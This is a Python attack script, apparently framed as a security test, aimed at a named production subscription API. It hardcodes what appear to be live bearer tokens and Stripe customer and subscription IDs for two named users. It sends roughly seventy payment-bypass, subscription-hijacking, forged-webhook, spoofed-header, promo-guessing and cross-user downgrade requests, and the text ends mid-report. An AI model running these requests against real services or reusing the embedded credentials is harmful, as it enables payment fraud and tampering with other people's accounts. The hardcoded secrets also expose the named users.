#!/usr/bin/env python3
"""
COMPREHENSIVE PAYMENT & SUBSCRIPTION MANIPULATION SECURITY TEST
================================================================
Tests ALL possible payment bypass and subscription manipulation vulnerabilities
in the Vaunt API across v1, v2, and v3 endpoints.

Test Accounts:
- Sameer (User 20254): Has Cabin+ subscription (subscriptionStatus: 3)
- Ashley (User 26927): No subscription (subscriptionStatus: null)

Attack Categories:
1. Direct subscription status modification
2. Stripe customer ID manipulation
3. Free trial activation
4. Membership tier manipulation
5. Payment verification bypass
6. Referral/promo code abuse
7. Priority score manipulation via subscription
8. Webhook exploitation
9. Header-based privilege escalation
10. API version inconsistencies
"""

import requests
import json
import time
from datetime import datetime

# API Configuration
PROD_URL = "https://vauntapi.flyvaunt.com"

# Test Account Credentials
SAMEER = {
    "name": "Sameer",
    "user_id": 20254,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q",
    "stripe_customer": "cus_PlS5D89fzdDYgF",
    "stripe_subscription": "sub_1RXC7YBkrWmvysmuXyGVEYPF",
    "subscription_status": 3,
    "tier": "cabin+"
}

ASHLEY = {
    "name": "Ashley",
    "user_id": 171208,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg",
    "subscription_status": None,
    "tier": None
}

# Test Results Tracking
results = {
    "total_tests": 0,
    "successful_exploits": [],
    "failed_tests": [],
    "critical_vulnerabilities": [],
    "high_vulnerabilities": [],
    "medium_vulnerabilities": [],
    "low_vulnerabilities": []
}

def make_request(method, endpoint, token, data=None, headers=None):
    """Make authenticated API request with optional custom headers"""
    default_headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    if headers:
        default_headers.update(headers)

    url = f"{PROD_URL}{endpoint}"

    try:
        if method == "GET":
            r = requests.get(url, headers=default_headers, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=default_headers, json=data, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=default_headers, json=data, timeout=10)
        elif method == "PUT":
            r = requests.put(url, headers=default_headers, json=data, timeout=10)
        elif method == "DELETE":
            r = requests.delete(url, headers=default_headers, json=data, timeout=10)

        result = {
            "status": r.status_code,
            "data": None,
            "raw_response": r.text[:500] if r.text else None
        }

        if r.text:
            try:
                result["data"] = r.json()
            except:
                result["data"] = r.text[:200]

        return result
    except Exception as e:
        return {"status": "error", "error": str(e), "data": None}

def get_user_status(token, user_name="User"):
    """Get current user status for verification"""
    result = make_request("GET", "/v1/user", token)
    if result['status'] == 200 and result['data']:
        return {
            "subscriptionStatus": result['data'].get('subscriptionStatus'),
            "membershipTier": result['data'].get('membershipTier'),
            "priorityScore": result['data'].get('priorityScore'),
            "stripeCustomerId": result['data'].get('stripeCustomerId'),
            "stripeSubscriptionId": result['data'].get('stripeSubscriptionId'),
            "license": result['data'].get('license')
        }
    return None

def test_attack(category, test_name, method, endpoint, token, user_name, data=None, headers=None, expected_behavior="rejected"):
    """Execute a single attack test and record results"""
    global results
    results["total_tests"] += 1

    print(f"\n{'='*80}")
    print(f"üî• TEST #{results['total_tests']}: {test_name}")
    print(f"{'='*80}")
    print(f"   Category: {category}")
    print(f"   User: {user_name}")
    print(f"   Request: {method} {endpoint}")
    if data:
        print(f"   Payload: {json.dumps(data, indent=2)}")
    if headers:
        print(f"   Custom Headers: {headers}")

    # Get baseline status
    baseline = get_user_status(token, user_name)

    # Execute attack
    result = make_request(method, endpoint, token, data, headers)

    print(f"   Response Status: {result['status']}")

    # Analyze results
    if result['status'] == 200:
        print("   ‚úÖ Request ACCEPTED (200 OK)")

        # Wait and check if anything changed
        time.sleep(0.5)
        new_status = get_user_status(token, user_name)

        if baseline and new_status:
            changes = []

            if new_status['subscriptionStatus'] != baseline['subscriptionStatus']:
                changes.append(f"subscriptionStatus: {baseline['subscriptionStatus']} ‚Üí {new_status['subscriptionStatus']}")

            if new_status['membershipTier'] != baseline['membershipTier']:
                changes.append(f"membershipTier: {baseline['membershipTier']} ‚Üí {new_status['membershipTier']}")

            if new_status['priorityScore'] != baseline['priorityScore']:
                changes.append(f"priorityScore: {baseline['priorityScore']} ‚Üí {new_status['priorityScore']}")

            if new_status['stripeCustomerId'] != baseline['stripeCustomerId']:
                changes.append(f"stripeCustomerId: {baseline['stripeCustomerId']} ‚Üí {new_status['stripeCustomerId']}")

            if new_status['stripeSubscriptionId'] != baseline['stripeSubscriptionId']:
                changes.append(f"stripeSubscriptionId: {baseline['stripeSubscriptionId']} ‚Üí {new_status['stripeSubscriptionId']}")

            if changes:
                print(f"\n   üö®üö®üö® VULNERABILITY FOUND! USER DATA MODIFIED! üö®üö®üö®")
                for change in changes:
                    print(f"   ‚ö†Ô∏è  {change}")

                # Determine severity
                severity = "CRITICAL"
                if "subscriptionStatus" in str(changes) and new_status['subscriptionStatus'] == 3:
                    severity = "CRITICAL"
                    cvss = 9.8
                    print(f"\n   ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è CRITICAL: User upgraded to Cabin+ without payment!")
                elif "stripeCustomerId" in str(changes) or "stripeSubscriptionId" in str(changes):
                    severity = "CRITICAL"
                    cvss = 9.5
                    print(f"\n   ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è CRITICAL: Stripe customer/subscription ID manipulated!")
                elif "priorityScore" in str(changes):
                    severity = "HIGH"
                    cvss = 7.5
                    print(f"\n   ‚ö†Ô∏è‚ö†Ô∏è HIGH: Priority score manipulated!")
                else:
                    severity = "MEDIUM"
                    cvss = 5.0

                vulnerability = {
                    "test_name": test_name,
                    "category": category,
                    "user": user_name,
                    "method": method,
                    "endpoint": endpoint,
                    "payload": data,
                    "headers": headers,
                    "changes": changes,
                    "severity": severity,
                    "cvss": cvss,
                    "before": baseline,
                    "after": new_status
                }

                results["successful_exploits"].append(vulnerability)

                if severity == "CRITICAL":
                    results["critical_vulnerabilities"].append(vulnerability)
                elif severity == "HIGH":
                    results["high_vulnerabilities"].append(vulnerability)
                elif severity == "MEDIUM":
                    results["medium_vulnerabilities"].append(vulnerability)
                else:
                    results["low_vulnerabilities"].append(vulnerability)

                return True, changes
            else:
                print("   ‚ÑπÔ∏è  Request accepted but no changes detected")
                if result['data']:
                    print(f"   Response: {json.dumps(result['data'], indent=2)[:300]}")

    elif result['status'] == 404:
        print("   ‚ùå Endpoint not found (404)")
    elif result['status'] == 401:
        print("   ‚úÖ Security working - Unauthorized (401)")
    elif result['status'] == 403:
        print("   ‚úÖ Security working - Forbidden (403)")
    elif result['status'] == 400:
        print("   ‚ö†Ô∏è  Bad request (400)")
        if result['data']:
            print(f"   Error: {result['data']}")
    else:
        print(f"   ‚ùå Error: Status {result['status']}")
        if result.get('error'):
            print(f"   Error details: {result['error']}")

    results["failed_tests"].append({
        "test_name": test_name,
        "status": result['status'],
        "endpoint": endpoint
    })

    return False, None

def run_all_tests():
    """Execute all payment and subscription manipulation tests"""

    print("="*80)
    print("COMPREHENSIVE PAYMENT & SUBSCRIPTION MANIPULATION SECURITY TEST")
    print("="*80)
    print(f"Target API: {PROD_URL}")
    print(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)

    # Get baseline statuses
    print("\nüìä BASELINE STATUS CHECK")
    print("="*80)

    sameer_baseline = get_user_status(SAMEER['token'], "Sameer")
    ashley_baseline = get_user_status(ASHLEY['token'], "Ashley")

    print(f"\nüîµ Sameer (User {SAMEER['user_id']}):")
    if sameer_baseline:
        print(f"   Subscription Status: {sameer_baseline['subscriptionStatus']}")
        print(f"   Membership Tier: {sameer_baseline['membershipTier']}")
        print(f"   Priority Score: {sameer_baseline['priorityScore']}")
        print(f"   Stripe Customer: {sameer_baseline['stripeCustomerId']}")
        print(f"   Stripe Subscription: {sameer_baseline['stripeSubscriptionId']}")

    print(f"\nüî¥ Ashley (User {ASHLEY['user_id']}):")
    if ashley_baseline:
        print(f"   Subscription Status: {ashley_baseline['subscriptionStatus']}")
        print(f"   Membership Tier: {ashley_baseline['membershipTier']}")
        print(f"   Priority Score: {ashley_baseline['priorityScore']}")
        print(f"   Stripe Customer: {ashley_baseline['stripeCustomerId']}")
        print(f"   Stripe Subscription: {ashley_baseline['stripeSubscriptionId']}")

    print("\n" + "="*80)
    print("STARTING ATTACK VECTOR TESTING")
    print("="*80)

    # ========================================================================
    # CATEGORY 1: DIRECT SUBSCRIPTION STATUS MODIFICATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 1: DIRECT SUBSCRIPTION STATUS MODIFICATION")
    print("="*80)

    test_attack(
        "Direct Subscription Modification",
        "Ashley: PATCH /v1/user with subscriptionStatus: 3",
        "PATCH", "/v1/user", ASHLEY['token'], "Ashley",
        {"subscriptionStatus": 3}
    )

    test_attack(
        "Direct Subscription Modification",
        "Ashley: PATCH /v2/user with subscriptionStatus: 3",
        "PATCH", "/v2/user", ASHLEY['token'], "Ashley",
        {"subscriptionStatus": 3}
    )

    test_attack(
        "Direct Subscription Modification",
        "Ashley: PATCH /v3/user with subscriptionStatus: 3",
        "PATCH", "/v3/user", ASHLEY['token'], "Ashley",
        {"subscriptionStatus": 3}
    )

    test_attack(
        "Direct Subscription Modification",
        f"Ashley: PUT /v1/user/{ASHLEY['user_id']} with subscriptionStatus: 3",
        "PUT", f"/v1/user/{ASHLEY['user_id']}", ASHLEY['token'], "Ashley",
        {"subscriptionStatus": 3}
    )

    test_attack(
        "Direct Subscription Modification",
        "Ashley: POST /v1/user/upgrade with tier cabin_plus",
        "POST", "/v1/user/upgrade", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus"}
    )

    test_attack(
        "Direct Subscription Modification",
        "Ashley: POST /v2/subscription/activate",
        "POST", "/v2/subscription/activate", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus", "subscriptionStatus": 3}
    )

    test_attack(
        "Direct Subscription Modification",
        "Ashley: POST /v1/subscription/enable",
        "POST", "/v1/subscription/enable", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus"}
    )

    test_attack(
        "Direct Subscription Modification",
        "Ashley: POST /v1/subscription/activate",
        "POST", "/v1/subscription/activate", ASHLEY['token'], "Ashley",
        {"membershipTier": "cabin_plus"}
    )

    test_attack(
        "Direct Subscription Modification",
        "Ashley: POST /v3/subscription/activate",
        "POST", "/v3/subscription/activate", ASHLEY['token'], "Ashley",
        {"subscriptionStatus": 3}
    )

    # ========================================================================
    # CATEGORY 2: STRIPE CUSTOMER ID MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 2: STRIPE CUSTOMER ID MANIPULATION")
    print("="*80)

    test_attack(
        "Stripe Manipulation",
        "Ashley: PATCH /v1/user with Sameer's Stripe Customer ID",
        "PATCH", "/v1/user", ASHLEY['token'], "Ashley",
        {"stripeCustomerId": SAMEER['stripe_customer']}
    )

    test_attack(
        "Stripe Manipulation",
        "Ashley: PATCH /v1/user with Sameer's Stripe Subscription ID",
        "PATCH", "/v1/user", ASHLEY['token'], "Ashley",
        {"stripeSubscriptionId": SAMEER['stripe_subscription']}
    )

    test_attack(
        "Stripe Manipulation",
        "Ashley: PATCH /v1/user with BOTH Sameer's Stripe IDs",
        "PATCH", "/v1/user", ASHLEY['token'], "Ashley",
        {
            "stripeCustomerId": SAMEER['stripe_customer'],
            "stripeSubscriptionId": SAMEER['stripe_subscription']
        }
    )

    test_attack(
        "Stripe Manipulation",
        "Ashley: POST /v1/stripe/link-customer with Sameer's customer ID",
        "POST", "/v1/stripe/link-customer", ASHLEY['token'], "Ashley",
        {"customerId": SAMEER['stripe_customer']}
    )

    test_attack(
        "Stripe Manipulation",
        "Ashley: POST /v2/stripe/link with Sameer's customer ID",
        "POST", "/v2/stripe/link", ASHLEY['token'], "Ashley",
        {"stripeCustomerId": SAMEER['stripe_customer']}
    )

    test_attack(
        "Stripe Manipulation",
        "Ashley: POST /v1/stripe/attach",
        "POST", "/v1/stripe/attach", ASHLEY['token'], "Ashley",
        {
            "customerId": SAMEER['stripe_customer'],
            "subscriptionId": SAMEER['stripe_subscription']
        }
    )

    # ========================================================================
    # CATEGORY 3: FREE TRIAL ACTIVATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 3: FREE TRIAL ACTIVATION")
    print("="*80)

    test_attack(
        "Free Trial Activation",
        "Ashley: POST /v1/trial/start",
        "POST", "/v1/trial/start", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus"}
    )

    test_attack(
        "Free Trial Activation",
        "Ashley: POST /v1/subscription/trial",
        "POST", "/v1/subscription/trial", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus"}
    )

    test_attack(
        "Free Trial Activation",
        "Ashley: POST /v2/trial/activate",
        "POST", "/v2/trial/activate", ASHLEY['token'], "Ashley",
        {"membershipTier": "cabin_plus"}
    )

    test_attack(
        "Free Trial Activation",
        "Ashley: POST /v1/user/activate-trial",
        "POST", "/v1/user/activate-trial", ASHLEY['token'], "Ashley",
        None
    )

    test_attack(
        "Free Trial Activation",
        "Ashley: GET /v1/trial/claim",
        "GET", "/v1/trial/claim", ASHLEY['token'], "Ashley",
        None
    )

    test_attack(
        "Free Trial Activation",
        "Ashley: POST /v3/trial/start",
        "POST", "/v3/trial/start", ASHLEY['token'], "Ashley",
        {"duration": 30}
    )

    test_attack(
        "Free Trial Activation",
        "Ashley: POST /v1/trial/activate with long duration",
        "POST", "/v1/trial/activate", ASHLEY['token'], "Ashley",
        {"duration": 365, "tier": "cabin_plus"}
    )

    # ========================================================================
    # CATEGORY 4: MEMBERSHIP TIER MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 4: MEMBERSHIP TIER MANIPULATION")
    print("="*80)

    test_attack(
        "Membership Tier Manipulation",
        "Ashley: PATCH /v1/user/license with premium tier",
        "PATCH", "/v1/user/license", ASHLEY['token'], "Ashley",
        {"membershipTier": {"id": 3, "name": "cabin_plus", "priorityLevel": 2}}
    )

    test_attack(
        "Membership Tier Manipulation",
        "Ashley: POST /v1/license/upgrade",
        "POST", "/v1/license/upgrade", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus"}
    )

    test_attack(
        "Membership Tier Manipulation",
        "Ashley: POST /v2/membership/upgrade",
        "POST", "/v2/membership/upgrade", ASHLEY['token'], "Ashley",
        {"tier": "premium"}
    )

    test_attack(
        "Membership Tier Manipulation",
        "Ashley: PUT /v1/membership",
        "PUT", "/v1/membership", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus", "level": 2}
    )

    test_attack(
        "Membership Tier Manipulation",
        "Ashley: PATCH /v1/user with membershipTier object",
        "PATCH", "/v1/user", ASHLEY['token'], "Ashley",
        {"membershipTier": "cabin_plus"}
    )

    test_attack(
        "Membership Tier Manipulation",
        "Ashley: POST /v1/user/license with full license object",
        "POST", "/v1/user/license", ASHLEY['token'], "Ashley",
        {
            "license": {
                "membershipTier": {"name": "cabin_plus", "priorityLevel": 2},
                "expiresAt": 9999999999999
            }
        }
    )

    # ========================================================================
    # CATEGORY 5: PAYMENT VERIFICATION BYPASS
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 5: PAYMENT VERIFICATION BYPASS")
    print("="*80)

    test_attack(
        "Payment Bypass",
        "Ashley: POST /v1/subscription/confirm without payment",
        "POST", "/v1/subscription/confirm", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus", "paid": True}
    )

    test_attack(
        "Payment Bypass",
        "Ashley: POST /v1/payment/verify with verified: true",
        "POST", "/v1/payment/verify", ASHLEY['token'], "Ashley",
        {"verified": True, "amount": 0}
    )

    test_attack(
        "Payment Bypass",
        "Ashley: POST /v1/subscription/activate with skipPayment",
        "POST", "/v1/subscription/activate", ASHLEY['token'], "Ashley",
        {"skipPayment": True, "tier": "cabin_plus"}
    )

    test_attack(
        "Payment Bypass",
        "Ashley: POST /v2/payment/complete with amount 0",
        "POST", "/v2/payment/complete", ASHLEY['token'], "Ashley",
        {"amount": 0, "tier": "cabin_plus"}
    )

    test_attack(
        "Payment Bypass",
        "Ashley: POST /v1/subscription/paymentIntent with amount 0",
        "POST", "/v1/subscription/paymentIntent", ASHLEY['token'], "Ashley",
        {"amount": 0, "membershipTier": "cabin_plus"}
    )

    test_attack(
        "Payment Bypass",
        "Ashley: POST /v1/payment/process with fake payment ID",
        "POST", "/v1/payment/process", ASHLEY['token'], "Ashley",
        {"paymentIntentId": "pi_fake_123456", "tier": "cabin_plus"}
    )

    test_attack(
        "Payment Bypass",
        "Ashley: POST /v3/subscription/validate with bypass flag",
        "POST", "/v3/subscription/validate", ASHLEY['token'], "Ashley",
        {"bypass": True, "subscriptionStatus": 3}
    )

    # ========================================================================
    # CATEGORY 6: REFERRAL/PROMO CODE ABUSE
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 6: REFERRAL/PROMO CODE ABUSE")
    print("="*80)

    promo_codes = [
        "FREE_CABIN_PLUS", "FREECABINPLUS", "CABIN100", "UPGRADE",
        "TRIAL30", "PREMIUM", "VIP", "FOUNDER", "BETA",
        "CABINPLUS", "FREE", "100OFF", "FULLACCESS"
    ]

    for code in promo_codes:
        test_attack(
            "Promo Code Abuse",
            f"Ashley: POST /v1/promo/apply with code '{code}'",
            "POST", "/v1/promo/apply", ASHLEY['token'], "Ashley",
            {"code": code}
        )

    test_attack(
        "Promo Code Abuse",
        "Ashley: POST /v1/referral/bonus",
        "POST", "/v1/referral/bonus", ASHLEY['token'], "Ashley",
        {"referralCode": "FREECABINPLUS"}
    )

    test_attack(
        "Promo Code Abuse",
        "Ashley: POST /v1/coupon/redeem with 100% discount",
        "POST", "/v1/coupon/redeem", ASHLEY['token'], "Ashley",
        {"code": "100OFF", "tier": "cabin_plus"}
    )

    test_attack(
        "Promo Code Abuse",
        "Ashley: POST /v2/promo/validate",
        "POST", "/v2/promo/validate", ASHLEY['token'], "Ashley",
        {"code": "FREECABINPLUS", "autoApply": True}
    )

    # ========================================================================
    # CATEGORY 7: PRIORITY SCORE MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 7: PRIORITY SCORE MANIPULATION VIA SUBSCRIPTION")
    print("="*80)

    test_attack(
        "Priority Score Manipulation",
        "Ashley: PATCH /v1/user with priorityScore and subscriptionStatus",
        "PATCH", "/v1/user", ASHLEY['token'], "Ashley",
        {"subscriptionStatus": 3, "priorityScore": 1931577847}
    )

    test_attack(
        "Priority Score Manipulation",
        "Ashley: PATCH /v2/user with priorityScore",
        "PATCH", "/v2/user", ASHLEY['token'], "Ashley",
        {"priorityScore": 1931577847}
    )

    test_attack(
        "Priority Score Manipulation",
        "Ashley: POST /v1/score/boost with subscription upgrade",
        "POST", "/v1/score/boost", ASHLEY['token'], "Ashley",
        {"subscriptionBonus": 1000000000}
    )

    # ========================================================================
    # CATEGORY 8: WEBHOOK EXPLOITATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 8: WEBHOOK EXPLOITATION")
    print("="*80)

    test_attack(
        "Webhook Exploitation",
        "Ashley: POST /v1/webhook/stripe with fake subscription.updated",
        "POST", "/v1/webhook/stripe", ASHLEY['token'], "Ashley",
        {
            "type": "customer.subscription.updated",
            "data": {
                "object": {
                    "id": "sub_fake123",
                    "customer": ASHLEY['user_id'],
                    "status": "active"
                }
            }
        }
    )

    test_attack(
        "Webhook Exploitation",
        "Ashley: POST /v1/stripe/webhook with payment success",
        "POST", "/v1/stripe/webhook", ASHLEY['token'], "Ashley",
        {
            "type": "payment_intent.succeeded",
            "data": {
                "object": {
                    "customer": str(ASHLEY['user_id']),
                    "amount": 0
                }
            }
        }
    )

    test_attack(
        "Webhook Exploitation",
        "Ashley: POST /v2/webhook/subscription",
        "POST", "/v2/webhook/subscription", ASHLEY['token'], "Ashley",
        {"userId": ASHLEY['user_id'], "status": "active", "tier": "cabin_plus"}
    )

    # ========================================================================
    # CATEGORY 9: HEADER-BASED PRIVILEGE ESCALATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 9: HEADER-BASED PRIVILEGE ESCALATION")
    print("="*80)

    special_headers_list = [
        {"X-Bypass-Payment": "true"},
        {"X-Admin": "true"},
        {"X-Override": "subscription"},
        {"X-Internal": "true"},
        {"X-Dev-Mode": "true"},
        {"X-Test-Mode": "true"},
        {"X-Skip-Validation": "true"},
        {"X-Force-Upgrade": "true"},
        {"X-Stripe-Bypass": "true"},
        {"X-Payment-Verified": "true"}
    ]

    for special_headers in special_headers_list:
        test_attack(
            "Header Privilege Escalation",
            f"Ashley: PATCH /v1/user with subscriptionStatus: 3 + header {list(special_headers.keys())[0]}",
            "PATCH", "/v1/user", ASHLEY['token'], "Ashley",
            {"subscriptionStatus": 3},
            special_headers
        )

    # ========================================================================
    # CATEGORY 10: CROSS-USER MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 10: CROSS-USER MANIPULATION")
    print("="*80)

    test_attack(
        "Cross-User Manipulation",
        "Sameer: PATCH /v1/user/26927 to upgrade Ashley",
        "PATCH", f"/v1/user/{ASHLEY['user_id']}", SAMEER['token'], "Sameer",
        {"subscriptionStatus": 3}
    )

    test_attack(
        "Cross-User Manipulation",
        "Ashley: PATCH /v1/user/20254 to downgrade Sameer",
        "PATCH", f"/v1/user/{SAMEER['user_id']}", ASHLEY['token'], "Ashley",
        {"subscriptionStatus": 0}
    )

    test_attack(
        "Cross-User Manipulation",
        "Ashley: POST /v1/subscription/transfer from Sameer",
        "POST", "/v1/subscription/transfer", ASHLEY['token'], "Ashley",
        {"fromUserId": SAMEER['user_id'], "toUserId": ASHLEY['user_id']}
    )

    # ========================================================================
    # CATEGORY 11: API VERSION INCONSISTENCIES
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 11: API VERSION INCONSISTENCIES")
    print("="*80)

    test_attack(
        "API Version Inconsistencies",
        "Ashley: PATCH /v3/user with all subscription fields",
        "PATCH", "/v3/user", ASHLEY['token'], "Ashley",
        {
            "subscriptionStatus": 3,
            "membershipTier": "cabin_plus",
            "stripeCustomerId": SAMEER['stripe_customer'],
            "stripeSubscriptionId": SAMEER['stripe_subscription']
        }
    )

    test_attack(
        "API Version Inconsistencies",
        "Ashley: POST /v3/subscription/upgrade",
        "POST", "/v3/subscription/upgrade", ASHLEY['token'], "Ashley",
        {"tier": "cabin_plus", "skipPayment": True}
    )

    # ========================================================================
    # CATEGORY 12: BATCH/BULK OPERATIONS
    # ========================================================================
    print("\n" + "="*80)
    print("CATEGORY 12: BATCH/BULK OPERATIONS")
    print("="*80)

    test_attack(
        "Batch Operations",
        "Ashley: PATCH /v1/users/batch with multiple users",
        "PATCH", "/v1/users/batch", ASHLEY['token'], "Ashley",
        {
            "users": [
                {"userId": ASHLEY['user_id'], "subscriptionStatus": 3}
            ]
        }
    )

    test_attack(
        "Batch Operations",
        "Ashley: POST /v1/subscription/bulk-activate",
        "POST", "/v1/subscription/bulk-activate", ASHLEY['token'], "Ashley",
        {"userIds": [ASHLEY['user_id']], "tier": "cabin_plus"}
    )

    # ========================================================================
    # FINAL VERIFICATION
    # ========================================================================
    print("\n" + "="*80)
    print("FINAL STATUS VERIFICATION")
    print("="*80)

    sameer_final = get_user_status(SAMEER['token'], "Sameer")
    ashley_final = get_user_status(ASHLEY['token'], "Ashley")

    print(f"\nüîµ Sameer (User {SAMEER['user_id']}) - FINAL STATUS:")
    if sameer_final:
        print(f"   Subscription Status: {sameer_final['subscriptionStatus']}")
        print(f"   Membership Tier: {sameer_final['membershipTier']}")
        print(f"   Priority Score: {sameer_final['priorityScore']}")

    print(f"\nüî¥ Ashley (User {ASHLEY['user_id']}) - FINAL STATUS:")
    if ashley_final:
        print(f"   Subscription Status: {ashley_final['subscriptionStatus']}")
        print(f"   Membership Tier: {ashley_final['membershipTier']}")
        print(f"   Priority Score: {ashley_final['priorityScore']}")

        if ashley_final['subscriptionStatus'] == 3:
            print("\n   üö®üö®üö® CRITICAL: ASHLEY HAS CABIN+ WITHOUT PAYMENT! üö®üö®üö®")

        if ashley_final['stripeCustomerId'] == SAMEER['stripe_customer']:
            print("\n   üö®üö®üö® CRITICAL: ASHLEY USING SAMEER'S STRIPE CUSTOMER! üö®üö®üö®")

    # ========================================================================
    # GENERATE SUMMARY REPORT
    # ========================================================================
    generate_summary_report(ashley_baseline, ashley_final, sameer_baseline, sameer_final)

def generate_summary_report(ashley_before, ashley_after, sameer_before, sameer_after):
    """Generate comprehensive summary report"""

    print("\n\n" + "="*80)
    print("COMPREHENSIVE SECURITY TEST SUMMARY")
    print("="*80)

    print(f"\nüìä TEST STATISTICS:")
    print(f"   Total Tests Executed: {results['total_tests']}")
    print(f"   Successful Exploits: {len(results['successful_exploits'])}")
    print(f"   Failed Tests: {len(results['failed_tests'])}")

    print(f"\n‚ö†Ô∏è  VULNERABILITY BREAKDOWN:")
    print(f"   üî¥ CRITICAL: {len(results['critical_vulnerabilities'])}")
    print(f"   üü† HIGH: {len(results['high_vulnerabilities'])}")
    print(f"   üü° MEDIUM: {len(results['medium_vulnerabilities'])}")
    print(f"   üü¢ LOW: {len(results['low_vulnerabilities'])}")

    print("\n" + "="*80)
    print("KEY SECURITY QUESTIONS")
    print("="*80)

    # Question 1: Can user upgrade to Cabin+ without payment?
    ashley_upgraded = (ashley_after and ashley_after['subscriptionStatus'] == 3)
    print(f"\n‚ùì Can user upgrade to Cabin+ without payment?")
    print(f"   Answer: {'üö® YES - CRITICAL VULNERABILITY!' if ashley_upgraded else '‚úÖ NO - Security working'}")

    # Question 2: Can user manipulate Stripe customer ID?
    stripe_manipulated = (
        ashley_after and ashley_before and
        ashley_after['stripeCustomerId'] != ashley_before['stripeCustomerId']
    )
    print(f"\n‚ùì Can user manipulate Stripe customer ID?")
    print(f"   Answer: {'üö® YES - CRITICAL VULNERABILITY!' if stripe_manipulated else '‚úÖ NO - Security working'}")

    # Question 3: Can user activate free trial?
    trial_activated = False
    for vuln in results['successful_exploits']:
        if 'trial' in vuln['test_name'].lower():
            trial_activated = True
            break
    print(f"\n‚ùì Can user activate free trial?")
    print(f"   Answer: {'‚ö†Ô∏è  YES - Vulnerability found' if trial_activated else '‚úÖ NO - Security working'}")

    # Question 4: Priority score manipulation
    priority_changed = (
        ashley_after and ashley_before and
        ashley_after['priorityScore'] != ashley_before['priorityScore']
    )
    print(f"\n‚ùì Can user manipulate priority score?")
    print(f"   Answer: {'‚ö†Ô∏è  YES - Vulnerability found' if priority_changed else '‚úÖ NO - Security working'}")

    if results['successful_exploits']:
        print("\n" + "="*80)
        print("üö® SUCCESSFUL EXPLOITS DETAILS")
        print("="*80)

        for i, vuln in enumerate(results['successful_exploits'], 1):
            print(f"\n#{i}. {vuln['test_name']}")
            print(f"   Severity: {vuln['severity']} (CVSS: {vuln['cvss']})")
            print(f"   Category: {vuln['category']}")
            print(f"   Endpoint: {vuln['method']} {vuln['endpoint']}")
            print(f"   Changes Made:")
            for change in vuln['changes']:
                print(f"      ‚Ä¢ {change}")

    print("\n" + "="*80)
    print("TEST COMPLETE")
    print("="*80)

    # Write results to markdown file
    write_markdown_report(ashley_before, ashley_after, sameer_before, sameer_after)

def write_markdown_report(ashley_before, ashley_after, sameer_before, sameer_after):
    """Write comprehensive markdown report"""

    report = f"""# PAYMENT & SUBSCRIPTION EXPLOITATION TEST RESULTS

**Test Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Target API:** {PROD_URL}
**Tester:** Automated Security Testing Suite

---

## EXECUTIVE SUMMARY

This comprehensive security test evaluated **{results['total_tests']} different attack vectors** targeting payment and subscription manipulation vulnerabilities in the Vaunt API.

### Test Statistics
- **Total Tests:** {results['total_tests']}
- **Successful Exploits:** {len(results['successful_exploits'])}
- **Failed Tests:** {len(results['failed_tests'])}

### Vulnerability Severity Breakdown
- üî¥ **CRITICAL:** {len(results['critical_vulnerabilities'])}
- üü† **HIGH:** {len(results['high_vulnerabilities'])}
- üü° **MEDIUM:** {len(results['medium_vulnerabilities'])}
- üü¢ **LOW:** {len(results['low_vulnerabilities'])}

---

## KEY SECURITY QUESTIONS

### 1. Can user upgrade to Cabin+ without payment?
"""

    ashley_upgraded = (ashley_after and ashley_after['subscriptionStatus'] == 3)
    if ashley_upgraded:
        report += """
**üö® YES - CRITICAL VULNERABILITY FOUND**

Ashley successfully upgraded to Cabin+ (subscriptionStatus: 3) without making any payment. This is a critical payment bypass vulnerability.

**CVSS Score:** 9.8 (Critical)
**Impact:** Complete payment bypass, revenue loss, unauthorized premium access
"""
    else:
        report += """
**‚úÖ NO - Security Working**

All attempts to upgrade to Cabin+ without payment were blocked.
"""

    report += """
### 2. Can user manipulate Stripe customer ID?
"""

    stripe_manipulated = (
        ashley_after and ashley_before and
        ashley_after['stripeCustomerId'] != ashley_before['stripeCustomerId']
    )
    if stripe_manipulated:
        report += """
**üö® YES - CRITICAL VULNERABILITY FOUND**

User was able to manipulate Stripe customer/subscription IDs, potentially allowing them to hijack another user's subscription.

**CVSS Score:** 9.5 (Critical)
**Impact:** Subscription hijacking, payment fraud, account takeover
"""
    else:
        report += """
**‚úÖ NO - Security Working**

All attempts to manipulate Stripe customer/subscription IDs were blocked.
"""

    report += """
### 3. Can user activate free trial?
"""

    trial_activated = any('trial' in v['test_name'].lower() for v in results['successful_exploits'])
    if trial_activated:
        report += """
**‚ö†Ô∏è YES - Vulnerability Found**

